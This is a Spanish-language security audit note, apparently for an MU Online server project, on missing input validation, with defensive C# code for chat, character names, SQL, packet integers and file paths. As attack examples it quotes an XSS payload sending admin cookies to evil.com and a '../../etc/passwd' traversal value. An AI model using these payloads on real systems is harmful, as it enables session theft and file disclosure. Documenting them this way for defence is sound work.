# 07 - Falta de Validación y Sanitización de Entrada

**Severidad:** MEDIA
**OWASP:** A03:2021 - Injection
**CWE:** CWE-20 (Improper Input Validation), CWE-79 (XSS)

---

## Qué es

**Validación de entrada** es verificar que los datos recibidos cumplen con el formato, tipo, longitud y rango esperados ANTES de procesarlos.

**Sanitización** es limpiar o transformar datos de entrada para eliminar contenido potencialmente peligroso.

Sin estas protecciones, un atacante puede enviar datos malformados que causen comportamiento inesperado.

---

## Problema 1: Chat sin sanitización

**Archivo:** `src/GameLogic/PlayerActions/Chat/ChatMessageAction.cs`

### Escenario de ataque

En MU Online el chat es texto plano, pero si el mensaje se muestra en algún panel web (admin panel, logs web, etc.), puede ser un vector de XSS:

```
Jugador envía: <script>document.location='http://evil.com/?c='+document.cookie</script>
```

Si el admin panel muestra logs de chat sin sanitizar:
- El admin visita la página de logs
- El script se ejecuta en el navegador del admin
- Las cookies de sesión del admin se envían al atacante

### Qué validar en mensajes de chat

```csharp
public async ValueTask HandleChatAsync(Player player, string message)
{
    // 1. Longitud máxima
    if (message.Length > MaxChatLength) // ej: 90 caracteres para MU
    {
        return;
    }

    // 2. Caracteres permitidos (solo printable ASCII y algunos Unicode)
    if (!IsValidChatMessage(message))
    {
        return;
    }

    // 3. Rate limiting (anti-spam)
    if (player.ChatRateLimiter.IsLimited())
    {
        return;
    }

    // 4. Si se muestra en web, HTML-encode al mostrar (nunca al guardar)
    // En Blazor esto es automático con @message
    // En HTML manual: HttpUtility.HtmlEncode(message)
}

private static bool IsValidChatMessage(string message)
{
    foreach (var c in message)
    {
        // Permitir solo caracteres imprimibles, rechazar control chars
        if (char.IsControl(c) && c != '\n')
            return false;
    }
    return true;
}
```

---

## Problema 2: Nombres de personaje - Validación mínima

**Archivo:** `src/GameLogic/PlayerActions/Chat/ChatMessageAction.cs:62-65`

### Escenario

Los nombres de personaje se muestran en múltiples contextos:
- En el juego (sobre la cabeza del personaje)
- En rankings web
- En logs del admin panel
- En bases de datos (queries)

### Qué validar

```csharp
public static bool IsValidCharacterName(string name)
{
    // 1. Longitud: MU Online permite 3-10 caracteres
    if (name.Length < 3 || name.Length > 10)
        return false;

    // 2. Solo caracteres alfanuméricos (sin espacios, sin especiales)
    foreach (var c in name)
    {
        if (!char.IsLetterOrDigit(c))
            return false;
    }

    // 3. No permitir nombres reservados
    var reserved = new[] { "admin", "gm", "server", "system", "[gm]" };
    if (reserved.Any(r => name.Equals(r, StringComparison.OrdinalIgnoreCase)))
        return false;

    // 4. No permitir nombres que parezcan HTML/script
    if (name.Contains('<') || name.Contains('>') || name.Contains('&'))
        return false;

    return true;
}
```

---

## Problema 3: SQL Injection - Estado actual

**Estado:** PROTEGIDO (Entity Framework usa consultas parametrizadas)

```csharp
// Ejemplo seguro (cómo está actualmente):
var account = await context.Accounts
    .FirstOrDefaultAsync(a => a.LoginName == loginName);
// Entity Framework genera: SELECT ... WHERE "LoginName" = @p0
// El valor @p0 se envía como parámetro, no concatenado al SQL
```

### Cuándo podrías introducir SQL injection accidentalmente

```csharp
// PELIGROSO - NUNCA hacer esto:
var query = $"SELECT * FROM Account WHERE LoginName = '{loginName}'";
await context.Database.ExecuteSqlRawAsync(query);

// SEGURO - usar parámetros:
await context.Database.ExecuteSqlRawAsync(
    "SELECT * FROM Account WHERE LoginName = {0}", loginName);

// O mejor, usar LINQ siempre que sea posible
```

**Regla:** Nunca usar `ExecuteSqlRaw` o `FromSqlRaw` con interpolación de strings. Entity Framework con LINQ es seguro por defecto.

---

## Problema 4: Integer overflow en paquetes

### Escenario

Los paquetes de red contienen valores numéricos (cantidad de zen, cantidad de items, coordenadas). Si no se validan los rangos:

```
Paquete de trade zen: [cantidad: 4294967295]  (uint.MaxValue)
¿El servidor maneja correctamente un trade de 4,294,967,295 zen?
¿Qué pasa si el jugador solo tiene 1000 zen?

Paquete de coordenadas: [x: 65535, y: 65535]
¿Existe esa posición en el mapa? ¿Qué pasa si no?
```

### Cómo validar

```csharp
// Para zen/gold:
public bool ValidateZenAmount(Player player, uint amount)
{
    if (amount == 0) return false;
    if (amount > player.Money) return false;

    // Verificar overflow en la suma para el receptor
    if (checked(receiver.Money + amount) > MaxZen)
        return false;

    return true;
}

// Para coordenadas:
public bool ValidatePosition(GameMap map, ushort x, ushort y)
{
    if (x >= map.Width || y >= map.Height)
        return false;

    if (!map.IsWalkable(x, y))
        return false;

    return true;
}
```

---

## Problema 5: Path traversal en recursos del cliente

**Archivo cliente:** `Client.Main/` (lectura de assets BMD, ATT, MAP)

### Escenario

Si el servidor pudiera enviar nombres de archivo al cliente (ej: nombre de mapa personalizado), y el cliente los usa para cargar archivos sin validar:

```csharp
// PELIGROSO:
var path = Path.Combine(DataPath, serverProvidedFilename);
var data = File.ReadAllBytes(path);
// Si serverProvidedFilename = "../../etc/passwd" → lee archivo del sistema

// SEGURO:
var path = Path.Combine(DataPath, serverProvidedFilename);
var fullPath = Path.GetFullPath(path);
if (!fullPath.StartsWith(Path.GetFullPath(DataPath)))
{
    throw new SecurityException("Path traversal attempt detected");
}
```

---

## Checklist de validación por tipo de dato

| Dato | Validaciones |
|---|---|
| Strings (nombre, chat) | Longitud min/max, charset permitido, sin control chars |
| Números (zen, stats) | Rango min/max, no negativos, overflow check |
| Coordenadas (x, y) | Dentro del mapa, posición caminable |
| IDs (item, player) | Existencia, pertenencia al jugador |
| Indices (slot) | Dentro del rango del array/inventario |
| Enums (tipo, clase) | Valor válido del enum |

### Patrón de validación defensiva

```csharp
// Template para cada packet handler:
public async ValueTask HandlePacketAsync(Player player, Memory<byte> packet)
{
    // 1. TAMAÑO
    if (packet.Length < MinSize || packet.Length > MaxSize)
        return;

    // 2. ESTADO del jugador (¿puede hacer esta acción ahora?)
    if (player.PlayerState.CurrentState != PlayerState.EnteredWorld)
        return;

    // 3. PARSEAR datos del paquete
    var data = ParsePacket(packet);
    if (data == null) return;

    // 4. VALIDAR cada campo
    if (!ValidateFields(player, data))
        return;

    // 5. EJECUTAR la acción
    await ExecuteAction(player, data);
}
```

---

## Referencias

- [OWASP: Input Validation Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html)
- [OWASP: XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Scripting_Prevention_Cheat_Sheet.html)
- [CWE-20: Improper Input Validation](https://cwe.mitre.org/data/definitions/20.html)
- [Integer Overflow Attacks](https://cwe.mitre.org/data/definitions/190.html)
